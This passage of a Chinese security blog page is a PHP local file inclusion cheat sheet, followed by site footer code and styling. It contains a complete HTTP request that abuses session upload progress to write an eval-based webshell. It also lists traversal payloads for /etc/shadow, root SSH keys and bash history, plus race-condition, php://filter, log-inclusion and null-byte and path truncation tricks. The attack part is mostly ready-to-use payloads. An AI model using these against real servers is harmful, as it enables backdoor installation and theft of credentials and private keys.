+</code></pre><h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI 本地文件包含"></a>LFI 本地文件包含</h3><h4 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h4><h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><p>结合<strong>PHP_SESSION_UPLOAD_PROGRESS</strong></p>
+<p>session文件默认路径</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+
+/var/lib/php5/sess_PHPSESSID
+/var/lib/php5/sessions/sess_PHPSESSID
+
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID</code></pre><pre><code class="html">POST /inc.php?file=/var/lib/php/sessions/sess_gaia HTTP/1.1
+Host: 118.88.99.44
+User-Agent: curl/7.47.0
+Connection: close
+Cookie: PHPSESSID=gaia;
+Content-Type: multipart/form-data; boundary=--------WebKitFormBoundary2rwkUEtFdqhGMHqV
+Content-Length: 419
+
+----------WebKitFormBoundary2rwkUEtFdqhGMHqV
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+blahblahblah
+----------WebKitFormBoundary2rwkUEtFdqhGMHqV
+Content-Disposition: form-data; name=&quot;file0&quot;; filename=&quot;&lt;?php file_put_contents(&#39;cmd.php&#39;,&#39;&lt;?php @eval($_POST[\&#39;c\&#39;]);?&gt;&#39;);?&gt;&quot;
+Content-Type: application/octet-stream
+
+
+abcxxxxxxxxxxxxxxxxxx paste big file here
+----------WebKitFormBoundary2rwkUEtFdqhGMHqV--
+</code></pre>
+<p>多线程跑一下</p>
+<p>其他可以控制session内容的情况</p>
+<p>包含session文件</p>
+<h5 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h5><p>包含自己上传的文件，如图片马</p>
+<h5 id="包含上传临时文件"><a href="#包含上传临时文件" class="headerlink" title="包含上传临时文件"></a>包含上传临时文件</h5><pre><code>php文件上传流程
+HTTP POST with a file arrives
+PHP begins analysis
+PHP creates temp file
+PHP writes data to temp file
+PHP close temp file
+script execution begins
+[optional] script moves uploaded file
+script execution ends
+PHP removes temp files(if any)</code></pre><p>结合phpinfo泄露临时文件路径</p>
+<p>利用php://filter漏洞(预计10分钟)</p>
+<pre><code>php7的低版本存在的bug
+include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
+在&quot;string.strip_tags&quot;中会产生segment fault，导致执行流程异常结束，上传的临时文件没有被删除。
+所以，多线程上传文件，多线程包含。</code></pre><p>竞争包含临时文件</p>
+<pre><code>目录在php.ini的upload_tmp_dir中定义，默认为空，则
+windows: 
+C:\windows\temp
+调用的函数是GetTempFileName
+&lt;path&gt;\&lt;pre&gt;&lt;uuuu&gt;.TMP
+C:\windows\temp   \    php  4个十六进制 .TMP
+
+共65535种文件名，且，利用当前系统时间(毫秒)，可以更加容易猜解
+更强的是，在windows本地文件包含中，可以利用&#39;&lt;&lt;&#39;代替&#39;*&#39;，利用&#39;&gt;&#39;代替&#39;?&#39;
+所以，
+http://site/vuln.php?inc=c:\windows\temp\php&lt;&lt;
+当然，当前目录可能存在别的文件，可以考虑限制为
+php1&lt;&lt; 或 phpA&lt;&lt; 或 php11&lt;&lt;
+然后，上传，直到匹配
+linux:
+/tmp/
+调用的函数是mkstemp
+1. random_value = (seed += time() ^ PID)
+2. random_value = (seed += (gettimeofday().sec &lt;&lt; 32 | gettimeofday().usec)
+^ PID)
+3. random_value = (seed += rdtsc ^ PID)
+最终，6 位 k=62 (A-Za-z0-9 charset) 字符
+拼接成 /tmp/phpUs7MxA
+情况太多，几乎无法利用，
+如果可能的话，是能够列举/tmp目录下的文件，且需要将文件上传到一个处理时间很长的页面
+利用竞争条件，包含文件。</code></pre><h5 id="包含-proc-self-environs"><a href="#包含-proc-self-environs" class="headerlink" title="包含/proc/self/environs"></a>包含/proc/self/environs</h5><pre><code>限制：PHP需要运行CGI，系统需要有/proc，PHP脚本需要有权限读取/proc/self/environ</code></pre><h5 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h5><pre><code>Apache log
+
+SSH log</code></pre><h4 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h4><pre><code>
+../../../../../etc/passwd  
+../../../../../etc/shadow
+../../../../../etc/hosts
+../../../../../var/lib/locate.db
+../../../../../var/lib/mlocate/mlocate.db
+../../../../etc/apache2/apache2.conf
+../../../../etc/apache2/sites-available/000-default.conf
+../../../../etc/apache2/conf/httpd.conf
+../../../../root/.bash_history
+../../../../root/.ssh/id_rsa
+../../../../var/log/apache/error.log
+C:/WINDOWS/win.ini
+C:/WINDOWS/system.ini
+结合PHP伪协议读取源码
+php://filter/read=convert.base64-encode/resource=./index
+php://filter/convert.base64-encode/resource=./index
+file协议读取文件
+file:///etc/passwd</code></pre><h3 id="限制文件名结尾部分"><a href="#限制文件名结尾部分" class="headerlink" title="限制文件名结尾部分"></a>限制文件名结尾部分</h3><pre><code class="php">&lt;?php
+include($_GET[&#39;file&#39;].&quot;.html&quot;);
+&gt;</code></pre>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><pre><code>?file=../../../../../../../../../etc/passwd%00
+(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
+%00截断目录遍历：
+?file=../../../../../../../../../var/www/%00
+(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</code></pre><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><pre><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
+(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</code></pre><h4 id="点号截断："><a href="#点号截断：" class="headerlink" title="点号截断："></a>点号截断：</h4><pre><code>?file=../../../../../../../../../boot.ini/………[…]…………
+(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</code></pre><h3 id="限制文件名开头部分"><a href="#限制文件名开头部分" class="headerlink" title="限制文件名开头部分"></a>限制文件名开头部分</h3><h4 id="回溯目录"><a href="#回溯目录" class="headerlink" title="../ 回溯目录"></a>../ 回溯目录</h4><pre><code>../../../../../../../</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
